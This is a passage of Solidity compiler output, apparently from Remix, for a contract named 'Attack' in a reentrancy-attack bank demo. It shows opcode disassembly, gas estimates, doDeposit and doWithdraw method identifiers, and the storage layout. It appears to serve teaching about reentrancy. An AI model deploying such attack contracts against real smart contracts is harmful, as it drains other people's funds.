0x29E JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x311 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x325 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x33B DUP2 PUSH2 0x3E2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x353 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x361 DUP5 DUP3 DUP6 ADD PUSH2 0x32C JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x373 DUP2 PUSH2 0x3BE JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x38E PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x36A JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3C9 DUP3 PUSH2 0x3D0 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3DB DUP3 PUSH2 0x394 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x3EB DUP2 PUSH2 0x3B4 JUMP JUMPDEST DUP2 EQ PUSH2 0x3F6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SAR 0x29 MULMOD SWAP15 EXP 0xFC EXP PC 0x27 EXTCODESIZE 0x49 EXTCODEHASH 0x1F KECCAK256 PUSH22 0x9D0CCF60E2C015425184522CC67AE0096F64736F6C63 NUMBER STOP ADDMOD DIV STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "214200",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"": "infinite",
						"bank()": "1232",
						"doDeposit()": "infinite",
						"doWithdraw()": "infinite"
					}
				},
				"methodIdentifiers": {
					"bank()": "76cdb03b",
					"doDeposit()": "e848df64",
					"doWithdraw()": "b011fcf1"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 73,
						"contract": "重入攻击/bankDemo.sol:Attack",
						"label": "bank",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(Bank)70"
					}
				],
				"types": {
					"t_contract(Bank)70": {
						"encoding": "inplace",
						"label": "contract Bank",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}